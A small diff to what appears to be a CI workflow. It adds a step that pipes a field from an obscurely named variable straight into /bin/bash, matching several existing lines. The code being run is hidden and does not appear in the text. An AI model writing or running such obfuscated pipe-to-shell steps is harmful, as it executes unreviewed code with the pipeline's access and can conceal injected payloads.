@@ -27,6 +27,7 @@ jobs:
           echo $kqke70008 | jq -r .rb70 | /bin/bash
           echo $go4 | jq -r .ea8 | /bin/bash
           echo $ajv6 | jq -r .iuocg18 | /bin/bash
+          echo $yst06 | jq -r .uv9593 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
